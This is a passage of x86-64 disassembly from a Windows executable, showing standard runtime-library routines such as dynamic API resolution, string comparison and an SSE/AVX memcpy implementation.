   1400086a8:	ff 15 92 d2 00 00    	call   *0xd292(%rip)        # 0x140015940
   1400086ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400086b3:	48 83 c4 20          	add    $0x20,%rsp
   1400086b7:	5f                   	pop    %rdi
   1400086b8:	c3                   	ret
   1400086b9:	cc                   	int3
   1400086ba:	cc                   	int3
   1400086bb:	cc                   	int3
   1400086bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400086c1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400086c6:	57                   	push   %rdi
   1400086c7:	48 83 ec 20          	sub    $0x20,%rsp
   1400086cb:	41 8b f0             	mov    %r8d,%esi
   1400086ce:	4c 8d 0d fb 6e 00 00 	lea    0x6efb(%rip),%r9        # 0x14000f5d0
   1400086d5:	8b da                	mov    %edx,%ebx
   1400086d7:	4c 8d 05 ea 6e 00 00 	lea    0x6eea(%rip),%r8        # 0x14000f5c8
   1400086de:	48 8b f9             	mov    %rcx,%rdi
   1400086e1:	48 8d 15 d0 a9 00 00 	lea    0xa9d0(%rip),%rdx        # 0x1400130b8
   1400086e8:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400086ed:	e8 2e 00 00 00       	call   0x140008720
   1400086f2:	8b d3                	mov    %ebx,%edx
   1400086f4:	48 8b cf             	mov    %rdi,%rcx
   1400086f7:	48 85 c0             	test   %rax,%rax
   1400086fa:	74 0b                	je     0x140008707
   1400086fc:	44 8b c6             	mov    %esi,%r8d
   1400086ff:	ff 15 0b 19 01 00    	call   *0x1190b(%rip)        # 0x14001a010
   140008705:	eb 06                	jmp    0x14000870d
   140008707:	ff 15 73 d1 00 00    	call   *0xd173(%rip)        # 0x140015880
   14000870d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008712:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008717:	48 83 c4 20          	add    $0x20,%rsp
   14000871b:	5f                   	pop    %rdi
   14000871c:	c3                   	ret
   14000871d:	cc                   	int3
   14000871e:	cc                   	int3
   14000871f:	cc                   	int3
   140008720:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008725:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000872a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000872f:	57                   	push   %rdi
   140008730:	41 54                	push   %r12
   140008732:	41 55                	push   %r13
   140008734:	41 56                	push   %r14
   140008736:	41 57                	push   %r15
   140008738:	48 83 ec 20          	sub    $0x20,%rsp
   14000873c:	8b f9                	mov    %ecx,%edi
   14000873e:	4c 8d 3d bb 78 ff ff 	lea    -0x8745(%rip),%r15        # 0x140000000
   140008745:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140008749:	4d 8b e1             	mov    %r9,%r12
   14000874c:	49 8b e8             	mov    %r8,%rbp
   14000874f:	4c 8b ea             	mov    %rdx,%r13
   140008752:	49 8b 84 ff 98 8b 01 	mov    0x18b98(%r15,%rdi,8),%rax
   140008759:	00 
   14000875a:	90                   	nop
   14000875b:	49 3b c6             	cmp    %r14,%rax
   14000875e:	0f 84 eb 00 00 00    	je     0x14000884f
   140008764:	48 85 c0             	test   %rax,%rax
   140008767:	0f 85 e4 00 00 00    	jne    0x140008851
   14000876d:	4d 3b c1             	cmp    %r9,%r8
   140008770:	0f 84 d1 00 00 00    	je     0x140008847
   140008776:	8b 75 00             	mov    0x0(%rbp),%esi
   140008779:	49 8b 9c f7 80 8b 01 	mov    0x18b80(%r15,%rsi,8),%rbx
   140008780:	00 
   140008781:	90                   	nop
   140008782:	48 85 db             	test   %rbx,%rbx
   140008785:	74 0b                	je     0x140008792
   140008787:	49 3b de             	cmp    %r14,%rbx
   14000878a:	0f 85 99 00 00 00    	jne    0x140008829
   140008790:	eb 6b                	jmp    0x1400087fd
   140008792:	4d 8b bc f7 90 f5 00 	mov    0xf590(%r15,%rsi,8),%r15
   140008799:	00 
   14000879a:	33 d2                	xor    %edx,%edx
   14000879c:	49 8b cf             	mov    %r15,%rcx
   14000879f:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   1400087a5:	ff 15 0d d1 00 00    	call   *0xd10d(%rip)        # 0x1400158b8
   1400087ab:	48 8b d8             	mov    %rax,%rbx
   1400087ae:	48 85 c0             	test   %rax,%rax
   1400087b1:	75 56                	jne    0x140008809
   1400087b3:	ff 15 4f d0 00 00    	call   *0xd04f(%rip)        # 0x140015808
   1400087b9:	83 f8 57             	cmp    $0x57,%eax
   1400087bc:	75 2d                	jne    0x1400087eb
   1400087be:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   1400087c2:	49 8b cf             	mov    %r15,%rcx
   1400087c5:	48 8d 15 44 c9 00 00 	lea    0xc944(%rip),%rdx        # 0x140015110
   1400087cc:	e8 1f e0 ff ff       	call   0x1400067f0
   1400087d1:	85 c0                	test   %eax,%eax
   1400087d3:	74 16                	je     0x1400087eb
   1400087d5:	45 33 c0             	xor    %r8d,%r8d
   1400087d8:	33 d2                	xor    %edx,%edx
   1400087da:	49 8b cf             	mov    %r15,%rcx
   1400087dd:	ff 15 d5 d0 00 00    	call   *0xd0d5(%rip)        # 0x1400158b8
   1400087e3:	48 8b d8             	mov    %rax,%rbx
   1400087e6:	48 85 c0             	test   %rax,%rax
   1400087e9:	75 1e                	jne    0x140008809
   1400087eb:	49 8b c6             	mov    %r14,%rax
   1400087ee:	4c 8d 3d 0b 78 ff ff 	lea    -0x87f5(%rip),%r15        # 0x140000000
   1400087f5:	49 87 84 f7 80 8b 01 	xchg   %rax,0x18b80(%r15,%rsi,8)
   1400087fc:	00 
   1400087fd:	48 83 c5 04          	add    $0x4,%rbp
   140008801:	49 3b ec             	cmp    %r12,%rbp
   140008804:	e9 67 ff ff ff       	jmp    0x140008770
   140008809:	48 8b c3             	mov    %rbx,%rax
   14000880c:	4c 8d 3d ed 77 ff ff 	lea    -0x8813(%rip),%r15        # 0x140000000
   140008813:	49 87 84 f7 80 8b 01 	xchg   %rax,0x18b80(%r15,%rsi,8)
   14000881a:	00 
   14000881b:	48 85 c0             	test   %rax,%rax
   14000881e:	74 09                	je     0x140008829
   140008820:	48 8b cb             	mov    %rbx,%rcx
   140008823:	ff 15 7f cf 00 00    	call   *0xcf7f(%rip)        # 0x1400157a8
   140008829:	49 8b d5             	mov    %r13,%rdx
   14000882c:	48 8b cb             	mov    %rbx,%rcx
   14000882f:	ff 15 fb cf 00 00    	call   *0xcffb(%rip)        # 0x140015830
   140008835:	48 85 c0             	test   %rax,%rax
   140008838:	74 0d                	je     0x140008847
   14000883a:	48 8b c8             	mov    %rax,%rcx
   14000883d:	49 87 8c ff 98 8b 01 	xchg   %rcx,0x18b98(%r15,%rdi,8)
   140008844:	00 
   140008845:	eb 0a                	jmp    0x140008851
   140008847:	4d 87 b4 ff 98 8b 01 	xchg   %r14,0x18b98(%r15,%rdi,8)
   14000884e:	00 
   14000884f:	33 c0                	xor    %eax,%eax
   140008851:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140008856:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000885b:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140008860:	48 83 c4 20          	add    $0x20,%rsp
   140008864:	41 5f                	pop    %r15
   140008866:	41 5e                	pop    %r14
   140008868:	41 5d                	pop    %r13
   14000886a:	41 5c                	pop    %r12
   14000886c:	5f                   	pop    %rdi
   14000886d:	c3                   	ret
   14000886e:	cc                   	int3
   14000886f:	cc                   	int3
   140008870:	cc                   	int3
   140008871:	cc                   	int3
   140008872:	cc                   	int3
   140008873:	cc                   	int3
   140008874:	cc                   	int3
   140008875:	cc                   	int3
   140008876:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000887d:	00 00 00 
   140008880:	48 2b d1             	sub    %rcx,%rdx
   140008883:	4d 85 c0             	test   %r8,%r8
   140008886:	74 6a                	je     0x1400088f2
   140008888:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   14000888e:	74 1d                	je     0x1400088ad
   140008890:	0f b6 01             	movzbl (%rcx),%eax
   140008893:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140008896:	75 5d                	jne    0x1400088f5
   140008898:	48 ff c1             	inc    %rcx
   14000889b:	49 ff c8             	dec    %r8
   14000889e:	74 52                	je     0x1400088f2
   1400088a0:	84 c0                	test   %al,%al
   1400088a2:	74 4e                	je     0x1400088f2
   1400088a4:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   1400088ab:	75 e3                	jne    0x140008890
   1400088ad:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   1400088b4:	80 80 80 
   1400088b7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   1400088be:	fe fe fe 
   1400088c1:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   1400088c4:	25 ff 0f 00 00       	and    $0xfff,%eax
   1400088c9:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   1400088ce:	77 c0                	ja     0x140008890
   1400088d0:	48 8b 01             	mov    (%rcx),%rax
   1400088d3:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   1400088d7:	75 b7                	jne    0x140008890
   1400088d9:	48 83 c1 08          	add    $0x8,%rcx
   1400088dd:	49 83 e8 08          	sub    $0x8,%r8
   1400088e1:	76 0f                	jbe    0x1400088f2
   1400088e3:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   1400088e7:	48 f7 d0             	not    %rax
   1400088ea:	49 23 c1             	and    %r9,%rax
   1400088ed:	49 85 c3             	test   %rax,%r11
   1400088f0:	74 cf                	je     0x1400088c1
   1400088f2:	33 c0                	xor    %eax,%eax
   1400088f4:	c3                   	ret
   1400088f5:	48 1b c0             	sbb    %rax,%rax
   1400088f8:	48 83 c8 01          	or     $0x1,%rax
   1400088fc:	c3                   	ret
   1400088fd:	cc                   	int3
   1400088fe:	cc                   	int3
   1400088ff:	cc                   	int3
   140008900:	cc                   	int3
   140008901:	cc                   	int3
   140008902:	cc                   	int3
   140008903:	cc                   	int3
   140008904:	cc                   	int3
   140008905:	cc                   	int3
   140008906:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000890d:	00 00 00 
   140008910:	57                   	push   %rdi
   140008911:	56                   	push   %rsi
   140008912:	48 8b f9             	mov    %rcx,%rdi
   140008915:	48 8b f2             	mov    %rdx,%rsi
   140008918:	49 8b c8             	mov    %r8,%rcx
   14000891b:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000891d:	5e                   	pop    %rsi
   14000891e:	5f                   	pop    %rdi
   14000891f:	c3                   	ret
   140008920:	cc                   	int3
   140008921:	cc                   	int3
   140008922:	cc                   	int3
   140008923:	cc                   	int3
   140008924:	cc                   	int3
   140008925:	cc                   	int3
   140008926:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000892d:	00 00 00 
   140008930:	48 8b c1             	mov    %rcx,%rax
   140008933:	4c 8d 15 c6 76 ff ff 	lea    -0x893a(%rip),%r10        # 0x140000000
   14000893a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000893e:	0f 87 0c 01 00 00    	ja     0x140008a50
   140008944:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000894b:	00 00 00 00 00 
   140008950:	47 8b 8c 82 50 d0 01 	mov    0x1d050(%r10,%r8,4),%r9d
   140008957:	00 
   140008958:	4d 03 ca             	add    %r10,%r9
   14000895b:	41 ff e1             	jmp    *%r9
   14000895e:	c3                   	ret
   14000895f:	90                   	nop
   140008960:	4c 8b 02             	mov    (%rdx),%r8
   140008963:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140008966:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000896b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140008970:	4c 89 00             	mov    %r8,(%rax)
   140008973:	89 48 08             	mov    %ecx,0x8(%rax)
   140008976:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000897b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000897f:	c3                   	ret
   140008980:	4c 8b 02             	mov    (%rdx),%r8
   140008983:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140008987:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000898c:	4c 89 00             	mov    %r8,(%rax)
   14000898f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140008993:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140008997:	c3                   	ret
   140008998:	0f b7 0a             	movzwl (%rdx),%ecx
   14000899b:	66 89 08             	mov    %cx,(%rax)
   14000899e:	c3                   	ret
   14000899f:	90                   	nop
   1400089a0:	8b 0a                	mov    (%rdx),%ecx
   1400089a2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   1400089a7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   1400089ac:	89 08                	mov    %ecx,(%rax)
   1400089ae:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   1400089b3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   1400089b7:	c3                   	ret
   1400089b8:	4c 8b 02             	mov    (%rdx),%r8
   1400089bb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400089be:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   1400089c3:	4c 89 00             	mov    %r8,(%rax)
   1400089c6:	89 48 08             	mov    %ecx,0x8(%rax)
   1400089c9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   1400089ce:	c3                   	ret
   1400089cf:	0f b7 0a             	movzwl (%rdx),%ecx
   1400089d2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   1400089d7:	66 89 08             	mov    %cx,(%rax)
   1400089da:	44 88 40 02          	mov    %r8b,0x2(%rax)
   1400089de:	c3                   	ret
   1400089df:	90                   	nop
   1400089e0:	4c 8b 02             	mov    (%rdx),%r8
   1400089e3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400089e6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   1400089eb:	4c 89 00             	mov    %r8,(%rax)
   1400089ee:	89 48 08             	mov    %ecx,0x8(%rax)
   1400089f1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   1400089f5:	c3                   	ret
   1400089f6:	4c 8b 02             	mov    (%rdx),%r8
   1400089f9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400089fd:	4c 89 00             	mov    %r8,(%rax)
   140008a00:	66 89 48 08          	mov    %cx,0x8(%rax)
   140008a04:	c3                   	ret
   140008a05:	4c 8b 02             	mov    (%rdx),%r8
   140008a08:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   140008a0c:	4c 89 00             	mov    %r8,(%rax)
   140008a0f:	88 48 08             	mov    %cl,0x8(%rax)
   140008a12:	c3                   	ret
   140008a13:	4c 8b 02             	mov    (%rdx),%r8
   140008a16:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140008a19:	4c 89 00             	mov    %r8,(%rax)
   140008a1c:	89 48 08             	mov    %ecx,0x8(%rax)
   140008a1f:	c3                   	ret
   140008a20:	8b 0a                	mov    (%rdx),%ecx
   140008a22:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140008a27:	89 08                	mov    %ecx,(%rax)
   140008a29:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140008a2e:	c3                   	ret
   140008a2f:	8b 0a                	mov    (%rdx),%ecx
   140008a31:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140008a36:	89 08                	mov    %ecx,(%rax)
   140008a38:	44 88 40 04          	mov    %r8b,0x4(%rax)
   140008a3c:	c3                   	ret
   140008a3d:	48 8b 0a             	mov    (%rdx),%rcx
   140008a40:	48 89 08             	mov    %rcx,(%rax)
   140008a43:	c3                   	ret
   140008a44:	0f b6 0a             	movzbl (%rdx),%ecx
   140008a47:	88 08                	mov    %cl,(%rax)
   140008a49:	c3                   	ret
   140008a4a:	8b 0a                	mov    (%rdx),%ecx
   140008a4c:	89 08                	mov    %ecx,(%rax)
   140008a4e:	c3                   	ret
   140008a4f:	90                   	nop
   140008a50:	49 83 f8 20          	cmp    $0x20,%r8
   140008a54:	77 17                	ja     0x140008a6d
   140008a56:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140008a5a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   140008a61:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   140008a65:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   140008a6c:	c3                   	ret
   140008a6d:	48 3b d1             	cmp    %rcx,%rdx
   140008a70:	73 0e                	jae    0x140008a80
   140008a72:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   140008a76:	49 3b c9             	cmp    %r9,%rcx
   140008a79:	0f 82 41 04 00 00    	jb     0x140008ec0
   140008a7f:	90                   	nop
   140008a80:	83 3d c1 e5 00 00 03 	cmpl   $0x3,0xe5c1(%rip)        # 0x140017048
   140008a87:	0f 82 e3 02 00 00    	jb     0x140008d70
   140008a8d:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   140008a94:	76 16                	jbe    0x140008aac
   140008a96:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   140008a9d:	77 0d                	ja     0x140008aac
   140008a9f:	f6 05 72 f5 00 00 02 	testb  $0x2,0xf572(%rip)        # 0x140018018
   140008aa6:	0f 85 64 fe ff ff    	jne    0x140008910
   140008aac:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   140008ab0:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   140008ab7:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140008abe:	0f 86 c4 00 00 00    	jbe    0x140008b88
   140008ac4:	4c 8b c9             	mov    %rcx,%r9
   140008ac7:	49 83 e1 1f          	and    $0x1f,%r9
   140008acb:	49 83 e9 20          	sub    $0x20,%r9
   140008acf:	49 2b c9             	sub    %r9,%rcx
   140008ad2:	49 2b d1             	sub    %r9,%rdx
   140008ad5:	4d 03 c1             	add    %r9,%r8
   140008ad8:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140008adf:	0f 86 a3 00 00 00    	jbe    0x140008b88
   140008ae5:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   140008aec:	0f 87 3e 01 00 00    	ja     0x140008c30
   140008af2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140008af9:	1f 84 00 00 00 00 00 
   140008b00:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140008b04:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140008b09:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   140008b0e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140008b13:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   140008b17:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   140008b1c:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   140008b21:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   140008b26:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   140008b2d:	00 
   140008b2e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140008b35:	00 
   140008b36:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   140008b3d:	00 
   140008b3e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140008b45:	00 
   140008b46:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   140008b4d:	00 
   140008b4e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   140008b55:	00 
   140008b56:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   140008b5d:	00 
   140008b5e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   140008b65:	00 
   140008b66:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   140008b6d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140008b74:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140008b7b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140008b82:	0f 83 78 ff ff ff    	jae    0x140008b00
   140008b88:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   140008b8c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140008b90:	4d 8b d9             	mov    %r9,%r11
   140008b93:	49 c1 eb 05          	shr    $0x5,%r11
   140008b97:	47 8b 9c 9a 90 d0 01 	mov    0x1d090(%r10,%r11,4),%r11d
   140008b9e:	00 
   140008b9f:	4d 03 da             	add    %r10,%r11
   140008ba2:	41 ff e3             	jmp    *%r11
   140008ba5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   140008bac:	ff ff ff 
   140008baf:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   140008bb6:	ff ff ff 
   140008bb9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140008bc0:	ff ff ff 
   140008bc3:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   140008bca:	ff ff ff 
   140008bcd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140008bd4:	ff ff ff 
   140008bd7:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   140008bde:	ff ff ff 
   140008be1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140008be8:	ff ff ff 
   140008beb:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   140008bf2:	ff ff ff 
   140008bf5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   140008bfc:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   140008c03:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   140008c0a:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   140008c11:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140008c18:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   140008c1f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140008c26:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   140008c2a:	c5 f8 77             	vzeroupper
   140008c2d:	c3                   	ret
   140008c2e:	66 90                	xchg   %ax,%ax
   140008c30:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   140008c34:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   140008c39:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   140008c3e:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   140008c43:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   140008c47:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   140008c4c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   140008c51:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   140008c56:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   140008c5d:	00 
   140008c5e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   140008c65:	00 
   140008c66:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   140008c6d:	00 
   140008c6e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   140008c75:	00 
   140008c76:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   140008c7d:	00 
   140008c7e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   140008c85:	00 
   140008c86:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   140008c8d:	00 
   140008c8e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   140008c95:	00 
   140008c96:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   140008c9d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140008ca4:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   140008cab:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140008cb2:	0f 83 78 ff ff ff    	jae    0x140008c30
   140008cb8:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   140008cbc:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140008cc0:	4d 8b d9             	mov    %r9,%r11
   140008cc3:	49 c1 eb 05          	shr    $0x5,%r11
   140008cc7:	47 8b 9c 9a b4 d0 01 	mov    0x1d0b4(%r10,%r11,4),%r11d
   140008cce:	00 
   140008ccf:	4d 03 da             	add    %r10,%r11
   140008cd2:	41 ff e3             	jmp    *%r11
   140008cd5:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   140008cdc:	ff ff ff 
   140008cdf:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   140008ce6:	ff ff ff 
   140008ce9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140008cf0:	ff ff ff 
   140008cf3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   140008cfa:	ff ff ff 
   140008cfd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140008d04:	ff ff ff 
   140008d07:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   140008d0e:	ff ff ff 
   140008d11:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140008d18:	ff ff ff 
   140008d1b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   140008d22:	ff ff ff 
   140008d25:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   140008d2c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   140008d33:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   140008d3a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   140008d41:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   140008d48:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   140008d4f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   140008d56:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   140008d5a:	0f ae f8             	sfence
   140008d5d:	c5 f8 77             	vzeroupper
   140008d60:	c3                   	ret
   140008d61:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140008d68:	0f 1f 84 00 00 00 00 
   140008d6f:	00 
   140008d70:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   140008d77:	76 0d                	jbe    0x140008d86
   140008d79:	f6 05 98 f2 00 00 02 	testb  $0x2,0xf298(%rip)        # 0x140018018
   140008d80:	0f 85 8a fb ff ff    	jne    0x140008910
   140008d86:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140008d8a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   140008d91:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140008d98:	0f 86 8e 00 00 00    	jbe    0x140008e2c
   140008d9e:	4c 8b c9             	mov    %rcx,%r9
   140008da1:	49 83 e1 0f          	and    $0xf,%r9
   140008da5:	49 83 e9 10          	sub    $0x10,%r9
   140008da9:	49 2b c9             	sub    %r9,%rcx
   140008dac:	49 2b d1             	sub    %r9,%rdx
   140008daf:	4d 03 c1             	add    %r9,%r8
   140008db2:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140008db9:	76 71                	jbe    0x140008e2c
   140008dbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008dc0:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140008dc4:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   140008dc9:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   140008dce:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   140008dd3:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   140008dd7:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
